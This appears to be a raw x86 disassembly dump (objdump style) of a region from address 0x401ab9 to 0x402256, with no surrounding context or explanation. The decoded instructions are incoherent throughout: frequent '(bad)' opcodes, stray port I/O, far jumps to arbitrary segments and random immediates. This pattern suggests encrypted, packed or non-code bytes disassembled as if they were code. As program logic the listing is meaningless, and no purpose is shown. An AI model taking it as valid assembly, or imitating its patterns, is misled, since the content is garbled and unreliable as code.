  401ab9:	ins    BYTE PTR es:[edi],dx
  401aba:	add    esp,edi
  401abc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abe:	je     0x401a5d
  401ac0:	and    eax,DWORD PTR [ebx+ebx*4]
  401ac3:	inc    ebx
  401ac4:	sub    bh,dl
  401ac6:	leave  
  401ac7:	inc    ebx
  401ac8:	add    BYTE PTR [ebp+esi*8-0x236987fc],0xe3
  401ad0:	std    
  401ad1:	enter  0xcd20,0x7
  401ad5:	sbb    al,0x48
  401ad7:	sbb    al,0x60
  401ad9:	out    0xb3,al
  401adb:	inc    esp
  401adc:	cdq    
  401add:	jae    0x401a7c
  401adf:	xor    edi,DWORD PTR ds:0xb1046868
  401ae5:	test   BYTE PTR [ebx-0x56bd3575],bh
  401aeb:	(bad)
  401aee:	and    esp,DWORD PTR [esi-0x4c8963c5]
  401af4:	daa    
  401af5:	inc    ebx
  401af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401af7:	fisub  DWORD PTR [esi+0x46b44984]
  401afd:	(bad)  
  401afe:	je     0x401ae5
  401b00:	ja     0x401b40
  401b02:	mov    ebp,0xbd416cb9
  401b07:	mov    al,0x1a
  401b09:	jecxz  0x401b53
  401b0b:	jp     0x401ad9
  401b0d:	mov    ebp,0x722c9990
  401b12:	lods   al,BYTE PTR ds:[esi]
  401b13:	ret    0xe68d
  401b16:	add    ch,BYTE PTR [edi-0x62222f5c]
  401b1c:	xlat   BYTE PTR ds:[ebx]
  401b1d:	pop    edi
  401b1e:	ficomp DWORD PTR [edi-0x62]
  401b21:	add    ecx,ebx
  401b23:	xchg   ecx,eax
  401b24:	enter  0x2c3,0x7e
  401b28:	xchg   edi,eax
  401b29:	das    
  401b2a:	jae    0x401ae8
  401b2c:	cwde   
  401b2d:	pop    ecx
  401b2e:	xchg   DWORD PTR [eax+0x3cc9c5de],esi
  401b34:	imul   ebx,DWORD PTR [eax+0x1eda488],0xffffffff
  401b3b:	stos   BYTE PTR es:[edi],al
  401b3c:	std    
  401b3d:	stos   DWORD PTR es:[edi],eax
  401b3e:	xchg   esi,eax
  401b3f:	mov    dl,0x78
  401b41:	inc    ebp
  401b42:	stc    
  401b43:	fidiv  DWORD PTR [ebx]
  401b45:	dec    esp
  401b46:	icebp  
  401b47:	mov    bh,0x31
  401b49:	nop
  401b4a:	push   ebx
  401b4b:	rol    BYTE PTR [edi+edx*1],1
  401b4e:	pop    esi
  401b4f:	jmp    0x401bb7
  401b51:	xchg   esi,eax
  401b52:	mov    ah,dh
  401b54:	or     esi,DWORD PTR [esi+0x3a8898b2]
  401b5a:	add    al,BYTE PTR [edi+eiz*1-0x6c]
  401b5e:	inc    edx
  401b5f:	sub    esi,DWORD PTR ss:[edi+0x25ad236f]
  401b66:	stos   DWORD PTR es:[edi],eax
  401b67:	push   cs
  401b68:	mov    ch,BYTE PTR [ebp+0x56b4b5a4]
  401b6e:	pop    ecx
  401b6f:	cmp    BYTE PTR [ebp-0x6df4ae10],cl
  401b75:	in     eax,dx
  401b76:	or     BYTE PTR [ecx+0x17],ah
  401b79:	in     eax,dx
  401b7a:	dec    DWORD PTR [ebx-0x23]
  401b7d:	popf   
  401b7e:	adc    DWORD PTR [edi+0x48024150],ebp
  401b84:	inc    edx
  401b85:	js     0x401b9f
  401b87:	cmc    
  401b88:	pusha  
  401b89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b8a:	aas    
  401b8b:	xor    ebx,ebp
  401b8d:	cmp    al,0xb9
  401b8f:	das    
  401b90:	mov    BYTE PTR [edi+0x5d],cl
  401b93:	pop    ebp
  401b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b95:	hlt    
  401b96:	frstor [ecx+0x3cdb364e]
  401b9c:	push   cs
  401b9d:	or     ecx,ebx
  401b9f:	xor    al,0xff
  401ba1:	retf   0xaf62
  401ba4:	int3   
  401ba5:	loopne 0x401b41
  401ba7:	sar    DWORD PTR [ecx],cl
  401ba9:	test   eax,0xe118d408
  401bae:	sbb    DWORD PTR [edi+0x58],esp
  401bb1:	icebp  
  401bb2:	mov    ds:0x2466f2d5,eax
  401bb7:	xchg   edi,eax
  401bb8:	outs   dx,BYTE PTR ds:[esi]
  401bb9:	pop    ds
  401bba:	mov    dl,0x49
  401bbc:	pusha  
  401bbd:	xchg   edi,eax
  401bbe:	nop
  401bbf:	lods   eax,DWORD PTR ds:[esi]
  401bc0:	xor    dl,BYTE PTR [esi+0x37c2c13c]
  401bc6:	jno    0x401bb2
  401bc8:	out    dx,eax
  401bc9:	pop    ss
  401bca:	push   ds
  401bcb:	sbb    ah,BYTE PTR [edx+eiz*2+0x57466227]
  401bd2:	(bad)  
  401bd4:	out    0x1b,eax
  401bd6:	cmp    BYTE PTR [ebx+0x4e],al
  401bd9:	mov    eax,0x45ab2ee8
  401bde:	repz or DWORD PTR [ebx],ecx
  401be1:	adc    eax,0x73eb1be4
  401be6:	mov    ds:0x3e6cb7c8,al
  401beb:	push   cs
  401bec:	out    0xcf,al
  401bee:	or     esp,edi
  401bf0:	and    dh,ah
  401bf2:	dec    edx
  401bf3:	pop    esp
  401bf4:	push   ecx
  401bf5:	mov    al,ds:0x87c38cc1
  401bfa:	test   al,0x5c
  401bfc:	pop    edi
  401bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bfe:	aam    0x61
  401c00:	xchg   edx,eax
  401c01:	cmp    DWORD PTR ds:0xc837bdb8,edx
  401c07:	retf   0x9f19
  401c0a:	dec    DWORD PTR [edi+ecx*2]
  401c0d:	jecxz  0x401c1f
  401c0f:	stos   DWORD PTR es:[edi],eax
  401c10:	enter  0x182a,0x88
  401c14:	pusha  
  401c15:	xchg   ebx,eax
  401c16:	and    esp,DWORD PTR [ebp+0x76]
  401c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c1a:	inc    esp
  401c1b:	std    
  401c1c:	cmp    BYTE PTR [ebx+0x48],dh
  401c1f:	jge    0x401c76
  401c21:	(bad)  
  401c22:	frstor ds:0xcf20cf4d
  401c28:	cdq    
  401c29:	mov    ah,0x76
  401c2b:	jl     0x401c7b
  401c2d:	div    DWORD PTR [ecx+ebx*1-0x77890e6f]
  401c34:	lods   eax,DWORD PTR ds:[esi]
  401c35:	push   ds
  401c36:	sahf   
  401c37:	mov    al,BYTE PTR [ebp+0x366e2a0f]
  401c3d:	iret   
  401c3e:	dec    esp
  401c3f:	xchg   edi,eax
  401c40:	in     eax,0x72
  401c42:	xchg   ebp,eax
  401c43:	(bad)
  401c47:	ins    BYTE PTR es:[edi],dx
  401c48:	data16 sar BYTE PTR ds:0xd19e8d0a,1
  401c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c50:	push   cs
  401c51:	pop    edx
  401c52:	sbb    ax,0xb4bb
  401c56:	pop    esp
  401c57:	xor    bl,BYTE PTR [edx]
  401c59:	push   es
  401c5a:	sub    eax,0xde5a33a5
  401c5f:	push   eax
  401c60:	sbb    al,0x1d
  401c62:	div    esp
  401c64:	mov    DWORD PTR [esi+0x77040069],edx
  401c6a:	leave  
  401c6b:	pusha  
  401c6c:	rcl    BYTE PTR [ecx-0x6a],0x18
  401c70:	xor    BYTE PTR [eax-0x2a],bh
  401c73:	cdq    
  401c74:	stos   BYTE PTR es:[edi],al
  401c75:	mov    al,0xe1
  401c77:	mov    dh,0xe5
  401c79:	je     0x401c05
  401c7b:	arpl   di,sp
  401c7d:	icebp  
  401c7e:	jmp    0xac0a:0x57a48f3b
  401c85:	lea    ebx,[edi-0x381acda1]
  401c8b:	das    
  401c8c:	in     eax,0xad
  401c8e:	int3   
  401c8f:	dec    edx
  401c90:	out    dx,al
  401c91:	stos   DWORD PTR es:[edi],eax
  401c92:	js     0x401c77
  401c94:	or     al,BYTE PTR [edx]
  401c96:	push   edi
  401c97:	rcr    BYTE PTR [eax+0x5d],0x4
  401c9b:	out    0x51,al
  401c9d:	mov    ecx,0x6e756ad6
  401ca2:	mov    al,0x3c
  401ca4:	es xchg ebp,eax
  401ca6:	or     dh,BYTE PTR [ecx+0x2a]
  401ca9:	int3   
  401caa:	mov    dl,dl
  401cac:	int3   
  401cad:	bound  ebp,QWORD PTR [eax+0x520cc0ff]
  401cb3:	push   0x2c
  401cb5:	mov    bl,0x97
  401cb7:	lea    eax,[esi-0x14]
  401cba:	and    ebp,DWORD PTR [eax]
  401cbc:	call   0x8f3a:0xbcc44469
  401cc3:	jmp    0x36fd:0x6d844acf
  401cca:	shl    BYTE PTR [ecx-0x44],0xc3
  401cce:	mov    ds:0x1c54013a,eax
  401cd3:	nop
  401cd4:	mov    DWORD PTR [bp+di+0x78],edi
  401cd8:	pushf  
  401cd9:	retf   
  401cda:	and    BYTE PTR [edi+0x2bf4abab],bh
  401ce0:	in     al,0xd7
  401ce2:	push   ss
  401ce3:	sbb    eax,0xe7c58e0d
  401ce8:	in     al,0x6d
  401cea:	mov    eax,0xa7366aa0
  401cef:	imul   esi,DWORD PTR [eax],0x5aa5414d
  401cf5:	jle    0x401cd4
  401cf7:	cmp    BYTE PTR [eax],bh
  401cf9:	(bad)  [ebx-0xfcfda56]
  401cff:	jge    0x401ccd
  401d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d02:	jmp    0x7efc580b
  401d07:	loope  0x401cc6
  401d09:	sbb    dl,0xf3
  401d0c:	ret    
  401d0d:	out    0x91,eax
  401d0f:	jo     0x401d39
  401d11:	test   eax,0xbef3930c
  401d16:	dec    eax
  401d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d18:	psubsw mm4,QWORD PTR [edx-0x4a]
  401d1c:	nop
  401d1d:	and    ch,dh
  401d1f:	xchg   ecx,eax
  401d20:	sbb    BYTE PTR [edx],ch
  401d22:	das    
  401d23:	adc    edx,DWORD PTR [edi-0x20]
  401d26:	or     eax,0x75cff332
  401d2c:	jge    0x401d55
  401d2e:	mov    edx,0xdf098db6
  401d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d35:	fwait
  401d36:	je     0x401d16
  401d38:	std    
  401d39:	pop    es
  401d3a:	mov    eax,ds:0xe3c06209
  401d3f:	cmp    ebx,DWORD PTR [eax]
  401d41:	out    0xb5,eax
  401d43:	popf   
  401d44:	repz sub al,0x2b
  401d47:	dec    esp
  401d48:	(bad)  
  401d4a:	add    eax,0x4247b3a2
  401d4f:	ins    BYTE PTR es:[edi],dx
  401d50:	xor    BYTE PTR [ebx+eiz*4-0x10],bh
  401d54:	jle    0x401d9a
  401d56:	dec    edi
  401d57:	ret    
  401d58:	sub    ch,ah
  401d5a:	mov    bh,BYTE PTR [eax+0xb]
  401d5d:	stos   DWORD PTR es:[edi],eax
  401d5e:	cmp    al,0xe
  401d60:	call   FWORD PTR [ecx+0x377d955]
  401d66:	mov    al,0x93
  401d68:	xchg   edi,eax
  401d69:	cmp    esi,eax
  401d6b:	adc    eax,eax
  401d6d:	fdiv   DWORD PTR [ecx-0xd]
  401d70:	pop    edx
  401d71:	arpl   WORD PTR [edx-0x1422db14],sp
  401d77:	dec    ecx
  401d78:	cdq    
  401d79:	push   ecx
  401d7a:	loopne 0x401d4b
  401d7c:	add    BYTE PTR [edi],ah
  401d7e:	fs popf 
  401d80:	js     0x401d37
  401d82:	pushf  
  401d83:	ins    BYTE PTR es:[edi],dx
  401d84:	fldcw  WORD PTR [esi]
  401d86:	into   
  401d87:	sbb    al,0xcf
  401d89:	adc    ecx,esp
  401d8b:	dec    edx
  401d8c:	pop    es
  401d8d:	mov    ebx,0xedc966a1
  401d92:	inc    edx
  401d93:	push   eax
  401d94:	inc    ecx
  401d95:	pop    ebx
  401d96:	sbb    BYTE PTR [edi],dl
  401d98:	repnz hlt 
  401d9a:	popf   
  401d9b:	iret   
  401d9c:	mul    eax
  401d9e:	jb     0x401d5e
  401da0:	add    al,0x95
  401da2:	call   eax
  401da4:	clc    
  401da5:	pop    edx
  401da6:	(bad)  
  401da7:	in     eax,dx
  401da8:	mov    edx,0x7747a7e5
  401dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dae:	das    
  401daf:	dec    edx
  401db0:	add    cl,BYTE PTR [ecx-0x22]
  401db3:	fistp  WORD PTR [ebx-0x7cd35dd5]
  401db9:	or     DWORD PTR [ecx-0x3f],edi
  401dbc:	mov    ds:0xe14d997d,al
  401dc1:	jmp    0x882d:0xef44dcc0
  401dc8:	inc    ebx
  401dc9:	ja     0x401dd2
  401dcb:	fnstcw WORD PTR ss:[edi]
  401dce:	enter  0x7c5d,0x4e
  401dd2:	cs dec edx
  401dd4:	xlat   BYTE PTR ds:[ebx]
  401dd5:	push   edi
  401dd6:	imul   ebp,DWORD PTR [ecx],0xffffff86
  401dd9:	inc    ebx
  401dda:	mov    ds:0x9d83c9a8,al
  401ddf:	sub    dl,BYTE PTR [ecx]
  401de1:	mov    WORD PTR [ecx+0x4ab14340],cs
  401de7:	fcomip st,st(6)
  401de9:	in     eax,dx
  401dea:	jg     0x401d9d
  401dec:	jge    0x401e2a
  401dee:	std    
  401def:	clc    
  401df0:	shl    BYTE PTR [esp+eax*2+0x6c],1
  401df4:	test   dh,al
  401df6:	test   BYTE PTR [esi+ebx*2-0x5d1f94ae],bh
  401dfd:	jmp    0x7abe:0x8e579b15
  401e04:	gs sti 
  401e06:	mov    DWORD PTR [ebp-0x52],edx
  401e09:	pop    ebx
  401e0a:	aam    0xff
  401e0c:	adc    esi,esp
  401e0e:	ins    DWORD PTR es:[edi],dx
  401e0f:	adc    eax,0x504f60f0
  401e14:	mov    ah,0x92
  401e16:	es inc eax
  401e18:	sbb    dh,BYTE PTR [edx]
  401e1a:	fdiv   DWORD PTR [ecx+0x4f76fc7e]
  401e20:	(bad)
  401e23:	cld    
  401e24:	mov    BYTE PTR [ecx-0x7a073215],al
  401e2a:	pop    esi
  401e2b:	pop    eax
  401e2c:	setnp  dl
  401e2f:	dec    ecx
  401e30:	dec    ebp
  401e31:	cmp    BYTE PTR [edi],0xb4
  401e34:	scas   eax,DWORD PTR es:[edi]
  401e35:	and    al,0xa8
  401e37:	addr16 push esp
  401e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e3a:	xor    bl,BYTE PTR [ecx+esi*4]
  401e3d:	cmc    
  401e3e:	pop    es
  401e3f:	stos   DWORD PTR es:[edi],eax
  401e40:	pop    edi
  401e41:	mov    al,0x65
  401e43:	sub    eax,0x59262a12
  401e48:	scas   al,BYTE PTR es:[edi]
  401e49:	ja     0x401e9c
  401e4b:	ss je  0x401e6b
  401e4e:	cmc    
  401e4f:	clc    
  401e50:	sub    DWORD PTR [ebx+0x3d],0x176cd27e
  401e57:	bound  ebp,QWORD PTR [edx]
  401e59:	test   DWORD PTR [ebp-0x76],esi
  401e5c:	in     al,dx
  401e5d:	lahf   
  401e5e:	rcr    DWORD PTR [ecx-0x1b434355],1
  401e64:	shr    BYTE PTR [esi+0x358bdb13],1
  401e6a:	xor    BYTE PTR [eax-0x22],dh
  401e6d:	inc    edx
  401e6e:	xor    al,0x40
  401e70:	ud1    eax,esp
  401e73:	add    al,0x27
  401e75:	jg     0x401edc
  401e77:	ret    
  401e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e79:	call   0x1d58:0xba321e81
  401e80:	sub    esp,eax
  401e82:	imul   ecx,DWORD PTR [eax-0x72],0x5ccd6dbf
  401e89:	mov    DWORD PTR [edx+0x54c54832],ebx
  401e8f:	push   esi
  401e90:	sub    DWORD PTR [edi+0x7e],0x37
  401e94:	inc    esi
  401e95:	mov    ebx,0x8a687738
  401e9a:	pop    ds
  401e9b:	add    al,0x3a
  401e9d:	nop
  401e9e:	out    dx,al
  401e9f:	and    dl,BYTE PTR ds:[ebp-0x31]
  401ea3:	and    al,BYTE PTR [edi]
  401ea5:	neg    BYTE PTR [ebx+0x3e9ee72f]
  401eab:	rcr    DWORD PTR ss:[edi+0x4a],0x95
  401eb0:	inc    edi
  401eb1:	mov    edx,0x174279e1
  401eb6:	call   0x1902:0xcb33628a
  401ebd:	fwait
  401ebe:	in     al,0xa8
  401ec0:	scas   al,BYTE PTR es:[edi]
  401ec1:	pop    edx
  401ec2:	cmp    eax,0x8e018949
  401ec7:	sti    
  401ec8:	pusha  
  401ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eca:	ins    DWORD PTR es:[edi],dx
  401ecb:	fnstcw WORD PTR [eax]
  401ecd:	enter  0xdee5,0xbe
  401ed1:	xchg   ebp,eax
  401ed2:	mov    al,0x7a
  401ed4:	add    bl,BYTE PTR [edx-0x3a40b98a]
  401eda:	sbb    DWORD PTR [edx-0xc5b8b6c],ecx
  401ee0:	sti    
  401ee1:	jmp    0xcb8e02f5
  401ee6:	xchg   DWORD PTR [edi],edx
  401ee8:	cmp    eax,0xc0ecaeed
  401eed:	jnp    0x401f5f
  401eef:	stc    
  401ef0:	jno    0x401e83
  401ef2:	pop    ds
  401ef3:	and    esi,DWORD PTR [edi-0x2b]
  401ef6:	into   
  401ef7:	xchg   esp,eax
  401ef8:	fld    QWORD PTR [edi-0x62]
  401efb:	push   ds
  401efc:	dec    esi
  401efd:	imul   ebx,ebx,0x3194299d
  401f03:	(bad)  
  401f04:	out    dx,eax
  401f05:	neg    BYTE PTR [ecx-0x7d71146d]
  401f0b:	daa    
  401f0c:	popf   
  401f0d:	jp     0x401f56
  401f0f:	mov    bl,0x21
  401f11:	jmp    0x637cf9c6
  401f16:	loopne 0x401f48
  401f18:	sub    eax,0xa96bd5be
  401f1d:	push   edi
  401f1e:	retf   0x5dec
  401f21:	xor    bh,BYTE PTR [ebx]
  401f23:	inc    edi
  401f24:	jmp    0x44b6b967
  401f29:	jno    0x401f72
  401f2b:	bound  esi,QWORD PTR [edx+0x41fe257b]
  401f31:	lock dec edx
  401f33:	inc    esp
  401f34:	xchg   DWORD PTR [esi+0x7ed7d4d8],esi
  401f3a:	sub    BYTE PTR [ebx+0x3f],bl
  401f3d:	mov    eax,DWORD PTR [ecx-0x76d2033d]
  401f43:	xor    esp,ebp
  401f45:	or     DWORD PTR [ebx],ecx
  401f47:	and    ecx,edi
  401f49:	jecxz  0x401f81
  401f4b:	sub    ecx,ecx
  401f4d:	sar    DWORD PTR [edi+0x7e58f540],cl
  401f53:	int3   
  401f54:	or     DWORD PTR [eax-0x7eb6d587],esi
  401f5a:	jb     0x401f23
  401f5c:	pop    es
  401f5d:	mov    bh,0x50
  401f5f:	jp     0x401eef
  401f61:	cmc    
  401f62:	sti    
  401f63:	mov    ecx,0x91da4a2b
  401f68:	iret   
  401f69:	jg     0x401f76
  401f6b:	mov    ds:0xdd675b57,al
  401f70:	jae    0x401fe2
  401f72:	or     al,0x4e
  401f74:	cli    
  401f75:	sti    
  401f76:	xchg   edi,eax
  401f77:	cmp    eax,0x64f2863d
  401f7c:	push   ecx
  401f7d:	loop   0x401f6c
  401f7f:	push   edi
  401f80:	xor    cl,ch
  401f82:	int    0xf6
  401f84:	(bad)  
  401f85:	das    
  401f86:	(bad)  
  401f87:	mov    eax,0x9b8d99f5
  401f8c:	pop    ecx
  401f8d:	add    eax,0x280493ef
  401f92:	setns  BYTE PTR [bp+si+0x4644]
  401f98:	scas   al,BYTE PTR es:[edi]
  401f99:	test   eax,0x54a29c76
  401f9e:	stos   DWORD PTR es:[edi],eax
  401f9f:	shl    BYTE PTR [esp+eax*4-0x66475a9],0xd1
  401fa7:	in     al,dx
  401fa8:	imul   ebx,DWORD PTR [ebp-0x3f812beb],0x7c7b03d4
  401fb2:	jmp    0xacdf:0xd03bdb05
  401fb9:	test   bh,ch
  401fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fbc:	mov    al,0x40
  401fbe:	das    
  401fbf:	es jnp 0x401f8f
  401fc2:	mov    eax,ds:0xddee2d45
  401fc7:	(bad)  
  401fca:	sahf   
  401fcb:	retf   
  401fcc:	mov    edi,0x952dc379
  401fd1:	jmp    0x402036
  401fd3:	mov    eax,0x562af786
  401fd8:	das    
  401fd9:	mov    edx,0x1f3433e9
  401fde:	(bad)  
  401fdf:	pushf  
  401fe0:	jle    0x401fdf
  401fe2:	out    dx,al
  401fe3:	mov    bl,0x34
  401fe5:	push   esi
  401fe6:	xchg   ebx,ecx
  401fe8:	stc    
  401fe9:	add    BYTE PTR [edi-0x789a8ca5],ch
  401fef:	push   esi
  401ff0:	inc    ebx
  401ff1:	fcom   st(7)
  401ff3:	mov    dl,0x70
  401ff5:	push   edi
  401ff6:	jmp    0x401fc0
  401ff8:	mov    al,BYTE PTR [edi]
  401ffa:	jns    0x402022
  401ffc:	imul   ebp,DWORD PTR [edx+0x4b],0xe3cc22c0
  402003:	data16 (bad) 
  402005:	fmul   st,st(7)
  402007:	inc    ebp
  402008:	jle    0x401ff7
  40200a:	ja     0x402077
  40200c:	or     eax,0xb76956e8
  402011:	pop    es
  402012:	stos   BYTE PTR es:[edi],al
  402013:	sub    edi,DWORD PTR [esp+ecx*1+0x1a]
  402017:	pop    es
  402018:	dec    edx
  402019:	sub    eax,ebx
  40201b:	sbb    eax,edi
  40201d:	out    dx,al
  40201e:	mov    esp,0x20551784
  402023:	adc    ebx,DWORD PTR [edi+0x12ffdad7]
  402029:	ds pop es
  40202b:	push   0xffffff9d
  40202d:	retf   
  40202e:	sahf   
  40202f:	scas   al,BYTE PTR es:[edi]
  402030:	dec    ebx
  402031:	sub    edx,DWORD PTR [eax+0x45]
  402034:	(bad)  
  402035:	sbb    eax,0x70fe7791
  40203a:	js     0x402064
  40203c:	lock hlt 
  40203e:	rol    DWORD PTR [ebp-0x58],cl
  402041:	ror    BYTE PTR [ebx],0x1f
  402044:	push   edx
  402045:	call   0x1668e34e
  40204a:	mov    bh,0x4d
  40204c:	and    eax,DWORD PTR ss:[esi]
  40204f:	mov    esp,0x85719a76
  402054:	ins    BYTE PTR es:[edi],dx
  402055:	cmp    eax,0x43aa4267
  40205a:	test   al,0x1c
  40205c:	sub    eax,0x75b283f0
  402061:	icebp  
  402062:	stos   DWORD PTR es:[edi],eax
  402063:	ss jge 0x4020d2
  402066:	pop    ecx
  402067:	and    bh,ah
  402069:	dec    edi
  40206a:	xor    BYTE PTR [ebx+0x30],ah
  40206d:	pop    ss
  40206e:	and    al,0xe5
  402070:	mov    ah,0x82
  402072:	mov    ebx,0xf037041e
  402077:	shl    BYTE PTR [edi+0x5ff77d2e],0xb1
  40207e:	cld    
  40207f:	adc    cl,dh
  402081:	enter  0xa7f6,0xa2
  402085:	or     BYTE PTR [edx+eiz*4+0x16],0xb1
  40208a:	sub    al,0xfe
  40208c:	test   al,0x9d
  40208e:	pop    ebp
  40208f:	jns    0x4020a4
  402091:	push   cs
  402092:	ins    BYTE PTR es:[edi],dx
  402093:	mov    esp,0x1d4c00e4
  402098:	aaa    
  402099:	sbb    BYTE PTR [ebp+0x4fe7c44a],bl
  40209f:	in     al,dx
  4020a0:	in     eax,0xf0
  4020a2:	or     BYTE PTR [edx],bl
  4020a4:	xor    al,0x1a
  4020a6:	jb     0x402046
  4020a8:	daa    
  4020a9:	mov    bl,0xba
  4020ab:	mov    edi,0x6bca784a
  4020b0:	mov    BYTE PTR [ecx+esi*8+0x32b3c7ce],dh
  4020b7:	and    al,0x66
  4020b9:	xlat   BYTE PTR ds:[ebx]
  4020ba:	dec    ecx
  4020bb:	pop    eax
  4020bc:	dec    edx
  4020bd:	std    
  4020be:	loope  0x402041
  4020c0:	inc    esp
  4020c1:	(bad)  
  4020c2:	(bad)  
  4020c4:	and    ah,BYTE PTR [edi-0x76]
  4020c7:	inc    edx
  4020c8:	jl     0x4020ef
  4020ca:	mov    bh,0xb8
  4020cc:	or     al,0x4f
  4020ce:	enter  0xe885,0x60
  4020d2:	cmp    DWORD PTR [eax],eax
  4020d4:	jge    0x402145
  4020d6:	push   ss
  4020d7:	adc    BYTE PTR [edi+edx*4-0x72644ffb],bh
  4020de:	xor    edi,ecx
  4020e0:	ror    BYTE PTR [ecx+0x3ff0a3b1],0xa1
  4020e7:	inc    esp
  4020e8:	pushf  
  4020e9:	pushf  
  4020ea:	mov    cl,0x6e
  4020ec:	xor    ch,ah
  4020ee:	mov    eax,ds:0xeb00c07d
  4020f3:	(bad)  
  4020f4:	(bad)  
  4020f5:	fcom   QWORD PTR [ecx]
  4020f7:	shl    bh,cl
  4020f9:	mov    cs,esi
  4020fb:	call   0x4818:0xffce9e53
  402102:	rcr    DWORD PTR [edx],1
  402104:	pop    ebp
  402105:	jge    0x40213e
  402107:	pop    edx
  402109:	repz xor BYTE PTR [edi+0x1584d42e],al
  402110:	or     BYTE PTR [ebp+0x65],0x90
  402114:	inc    ebx
  402115:	ret    
  402116:	loop   0x402106
  402118:	mov    ecx,0xd470bcdf
  40211d:	jb     0x40214a
  40211f:	mov    ebx,0x746ecb08
  402124:	xor    ebx,DWORD PTR [eax+0x73ae1e84]
  40212a:	retf   
  40212b:	or     DWORD PTR [ebx-0x56],ecx
  40212e:	cmp    al,BYTE PTR [edi+0x2b]
  402131:	mov    cl,0x17
  402133:	inc    edi
  402134:	call   0x8973721e
  402139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40213a:	cmp    BYTE PTR [ebp-0x19],bh
  40213d:	ins    DWORD PTR es:[edi],dx
  40213e:	out    0x87,eax
  402140:	mov    esp,0x3cd6da7c
  402145:	mov    edi,0x1c7852d0
  40214a:	push   0xffffffb3
  40214c:	and    ebx,DWORD PTR [esi+0x4512eb00]
  402152:	popf   
  402153:	push   ebx
  402154:	je     0x4021a7
  402156:	cmc    
  402157:	fwait
  402158:	aaa    
  402159:	mov    ds:0x1096ade7,eax
  40215e:	mov    al,ds:0x6cd3ed9d
  402163:	jo     0x402149
  402165:	pop    ax
  402167:	cld    
  402168:	(bad)  
  402169:	(bad)  
  40216a:	and    DWORD PTR [esi-0x65],ebx
  40216d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40216e:	test   esi,eax
  402170:	cmp    cl,BYTE PTR [edi+eiz*8]
  402173:	into   
  402174:	pushw  es
  402176:	adc    DWORD PTR [ebp-0x32],0x698bfeeb
  40217d:	scas   al,BYTE PTR es:[edi]
  40217e:	bound  ecx,QWORD PTR [ecx-0x36c9b2a6]
  402184:	fndisi(8087 only) 
  402186:	add    dl,0xe4
  402189:	inc    ecx
  40218a:	pop    ds
  40218b:	mov    esp,0x753b423e
  402190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402191:	mov    bl,0x2c
  402193:	sbb    bh,BYTE PTR [ecx]
  402195:	stc    
  402196:	sub    DWORD PTR [eax+0x5a],esp
  402199:	sbb    BYTE PTR [edx-0x67],bh
  40219c:	xor    DWORD PTR [eax-0x19],ecx
  40219f:	popf   
  4021a0:	ja     0x4021ea
  4021a2:	in     eax,dx
  4021a3:	enter  0xf96a,0x3a
  4021a7:	fnsave [edi+0x31f4c7ae]
  4021ad:	dec    ebx
  4021ae:	retf   
  4021af:	lock scas al,BYTE PTR es:[edi]
  4021b1:	mov    dl,0x5b
  4021b3:	ror    BYTE PTR [edi],0xc9
  4021b6:	loope  0x402168
  4021b8:	loopne 0x4021f7
  4021ba:	push   ss
  4021bb:	mov    ds:0x39113e99,eax
  4021c0:	xchg   edx,eax
  4021c1:	rcl    BYTE PTR [ecx+0x4bda4822],0x75
  4021c8:	dec    ebx
  4021c9:	ins    BYTE PTR es:[edi],dx
  4021ca:	sub    dl,BYTE PTR [edi]
  4021cc:	icebp  
  4021cd:	add    dl,BYTE PTR [edi]
  4021cf:	xchg   BYTE PTR [ecx-0x4ece79f2],dl
  4021d5:	cmp    cl,BYTE PTR [eax+ebx*2]
  4021d8:	test   DWORD PTR [edx],ecx
  4021da:	scas   eax,DWORD PTR es:[edi]
  4021db:	push   es
  4021dc:	dec    esi
  4021dd:	cmp    eax,0x32281210
  4021e2:	mul    DWORD PTR [edi]
  4021e4:	or     eax,0x7c496d97
  4021e9:	and    eax,0xa4818e88
  4021ee:	add    ah,BYTE PTR ds:0xa0f8dd26
  4021f4:	jbe    0x402258
  4021f6:	test   DWORD PTR cs:[edx+0x56],edi
  4021fa:	popf   
  4021fb:	and    eax,0x1dd04474
  402200:	mov    ds:0xfa4018ea,al
  402205:	cmp    DWORD PTR ds:0x69e0c7f1,0x26340cf2
  40220f:	push   cs
  402210:	and    eax,esi
  402212:	(bad)  
  402213:	jmp    0x79a8:0xddbd73da
  40221a:	fdiv   QWORD PTR [ebp+0x6b327763]
  402220:	ins    BYTE PTR es:[edi],dx
  402221:	xor    dh,BYTE PTR [ecx+ebp*1]
  402224:	stos   DWORD PTR es:[edi],eax
  402225:	int3   
  402226:	sbb    DWORD PTR [ecx+edi*1-0x28],esi
  40222a:	xchg   ebp,eax
  40222b:	aad    0x20
  40222d:	push   ebp
  40222e:	jno    0x4021b6
  402230:	ins    BYTE PTR es:[edi],dx
  402231:	xor    al,0x43
  402233:	push   cs
  402234:	xchg   ebp,eax
  402235:	(bad)  
  402236:	vmwrite edx,DWORD PTR [eax]
  402239:	and    BYTE PTR [ebx-0xe5f3abf],al
  40223f:	push   ss
  402240:	daa    
  402241:	out    dx,al
  402242:	stc    
  402243:	dec    edx
  402244:	aad    0xc0
  402246:	xor    al,ah
  402248:	loop   0x4021ff
  40224a:	enter  0x11f7,0x63
  40224e:	js     0x4022b5
  402250:	stos   BYTE PTR es:[edi],al
  402251:	jns    0x4022c5
  402253:	inc    esi
  402254:	inc    ebx
  402255:	push   ds
  402256:	or     eax,DWORD PTR [ebp+0x3e]
